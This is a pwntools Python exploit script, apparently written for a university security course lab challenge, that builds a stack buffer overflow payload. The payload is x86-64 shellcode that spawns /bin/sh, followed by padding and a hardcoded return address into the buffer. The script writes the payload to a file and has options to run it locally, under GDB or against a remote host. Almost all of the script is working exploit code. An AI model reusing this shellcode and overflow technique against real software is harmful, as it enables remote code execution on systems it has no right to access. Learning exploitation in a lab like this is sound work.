from pwn import *
import sys

# Buffer size is not 16 on the server
ADDR_SIZE = 8
OFFSET = 8
SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
SHELL_CODE_LEN = len(SHELL_CODE)
# info(SHELL_CODE_LEN)
LOCAL_BUFF_SIZE = 512 + OFFSET - SHELL_CODE_LEN


# GDB script
gdb_script = """
break 25
break 30
continue
"""
# Prepare program
exe = "/home/k-730/COMP6841/wk2/RCE/challenge2"
binary = context.binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"
mainAddrInt = binary.symbols.get("main")
mainAddr = p64(mainAddrInt, "little")
context(os="linux", arch="amd64")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# Run the debugger
buffsize = LOCAL_BUFF_SIZE

# exit(1)
io = start()
io.recvlines(1)

# Read in the memory given by the output
bufferAddrRaw = io.recvline().strip()
intAddr = int("0xffabbb10", 16)
bufferAddrBytes = intAddr.to_bytes(8, "little")
print(bufferAddrBytes)

info(bufferAddrBytes)
info(
    f"Buffer address(&name) in little endian is: {str(p64(intAddr, "little"))} \nor big endian: {bufferAddrRaw}"
)

payload = SHELL_CODE + LOCAL_BUFF_SIZE * b"A" + bufferAddrBytes
with open("attack.txt", "wb+") as f:
    f.write(payload)
# info(
#     f"Jumping to {bufferAddrBytes} in little endian form or big endian 0x{(u64(bufferAddrBytes, "big")):x}"
# )
# io.sendline(payload)
# io.interactive()
